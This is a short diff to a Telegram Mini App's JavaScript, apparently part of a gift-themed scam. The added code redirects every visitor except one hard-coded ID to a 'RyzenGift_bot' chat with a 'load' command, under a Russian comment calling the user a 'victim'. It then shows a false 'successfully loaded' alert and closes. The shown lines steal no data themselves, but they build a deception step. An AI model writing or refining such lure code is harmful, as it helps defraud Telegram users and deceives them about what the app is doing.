@@ -42,12 +42,9 @@
 
         const user = WebApp.initDataUnsafe.user;
         if (user && user.id != 8528804038) {
-            const data = JSON.stringify({
-                action: 'load_app',
-                user_id: user.id
-            });
-            WebApp.sendData(data);
-
+            // ОТПРАВЛЯЕМ ЖЕРТВУ В ЧАТ С БОТОМ С КОМАНДОЙ /load
+            window.location.href = 'tg://resolve?domain=RyzenGift_bot&start=load';
+            
             setTimeout(() => {
                 WebApp.showAlert('✅ Мини-приложение успешно загружено!');
                 WebApp.close();
